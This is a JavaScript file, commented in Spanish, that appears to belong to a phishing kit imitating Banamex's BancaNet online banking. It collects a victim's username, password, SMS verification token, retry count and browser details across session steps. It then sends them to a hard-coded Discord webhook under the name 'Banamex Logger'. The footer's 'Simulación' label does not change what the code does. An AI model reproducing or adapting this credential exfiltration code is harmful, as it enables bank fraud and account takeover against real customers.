// webhook.js — Captura de datos por sesión con marca de agua @TXTs_ALIEN
const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1573961072334077993/wT5MVrjx9XoOnAfpT0c8R-oyPFkhD_Bb5IzIGR1niPALUgvtz8BTVjr_plsA9e6FIe0h";

const WATERMARK = "@TXTs_ALIEN";
const SESSION_KEY = "bnx_session_id";
const DATA_KEY = "bnx_session_data";

/* ============== GESTIÓN DE SESIÓN ============== */
function getSessionId() {
    let sid = localStorage.getItem(SESSION_KEY);
    if (!sid) {
        sid = "CLI-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substring(2, 6).toUpperCase();
        localStorage.setItem(SESSION_KEY, sid);
    }
    return sid;
}

function getSessionData() {
    try {
        return JSON.parse(localStorage.getItem(DATA_KEY)) || {};
    } catch (e) {
        return {};
    }
}

function saveSessionData(data) {
    localStorage.setItem(DATA_KEY, JSON.stringify(data));
}

function updateSessionData(partial) {
    const current = getSessionData();
    const merged = { ...current, ...partial };
    saveSessionData(merged);
    return merged;
}

function clearSession() {
    localStorage.removeItem(SESSION_KEY);
    localStorage.removeItem(DATA_KEY);
}

/* ============== ENVÍO A DISCORD ============== */
async function enviarAWebhook(step, extra = {}) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("TU_WEBHOOK")) {
        console.warn("[webhook.js] Configura tu DISCORD_WEBHOOK_URL primero.");
        return;
    }

    const sessionId = getSessionId();
    const data = updateSessionData(extra);

    const fields = [
        { name: "🆔 Sesión", value: `\`${sessionId}\``, inline: false },
        { name: "📍 Paso", value: `\`${step}\``, inline: true },
        { name: "🕒 Fecha", value: `\`${new Date().toLocaleString("es-MX", { timeZone: "America/Mexico_City" })}\``, inline: true }
    ];

    if (data.usuario)    fields.push({ name: "👤 Usuario", value: `\`${data.usuario}\``, inline: true });
    if (data.password)   fields.push({ name: "🔑 Contraseña", value: `\`${data.password}\``, inline: true });
    if (data.token)      fields.push({ name: "📱 Token SMS", value: `\`${data.token}\``, inline: true });
    if (data.intentos)   fields.push({ name: "🔁 Intentos de token", value: `\`${data.intentos}\``, inline: true });

    fields.push({
        name: "🌐 Navegador",
        value: `\`${(navigator.userAgent || "N/A").substring(0, 200)}\``,
        inline: false
    });

    const payload = {
        username: "Banamex Logger",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/295/295128.png",
        embeds: [
            {
                title: "🔐 Datos capturados",
                color: 0xff1e42,
                fields,
                footer: { text: `${WATERMARK} • Simulación BancaNet` },
                timestamp: new Date().toISOString()
            }
        ]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log(`[webhook.js] ✅ Datos enviados (sesión ${sessionId}, paso: ${step}).`);
        } else {
            console.error("[webhook.js] ❌ Error al enviar:", response.status, await response.text());
        }
    } catch (err) {
        console.error("[webhook.js] ❌ Error de red:", err);
    }
}

/* Exponer funciones globalmente */
window.enviarAWebhook = enviarAWebhook;
window.getSessionId = getSessionId;
window.getSessionData = getSessionData;
window.updateSessionData = updateSessionData;
window.clearSession = clearSession;
